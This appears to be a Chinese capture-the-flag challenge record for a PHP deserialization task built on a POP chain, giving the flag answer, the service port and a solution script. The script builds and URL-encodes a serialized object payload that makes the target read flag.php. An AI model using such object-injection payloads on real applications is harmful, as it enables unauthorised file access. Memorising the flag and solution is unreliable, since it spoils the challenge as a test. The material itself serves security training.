# 题目：php反序列化3

### 题目描述：php的序列化的pop链构造

### 题目难度： 🌟🌟🌟

### 维护：SiJiDo

### KEY: `NSCTF{688ec49b4fdf60ac442fd0325871b446}`

### 配置信息： 

1. 开放端口： `10005`

### 解题过程：

```
<?php

class DemoX{
    protected $user;
    protected $sex;
	function __construct(){
		$this->user = new Demo2("flag.php");
	   // $this->user = "dd";
        $this->sex = "xxx";
	}
}

class Demo2{
    private $fffl4g;

	function __construct($file){
		$this->fffl4g = $file;
	}

}

$user = new DemoX();
$user = serialize($user);
echo $user . "<hr>";
echo urlencode($user);
```

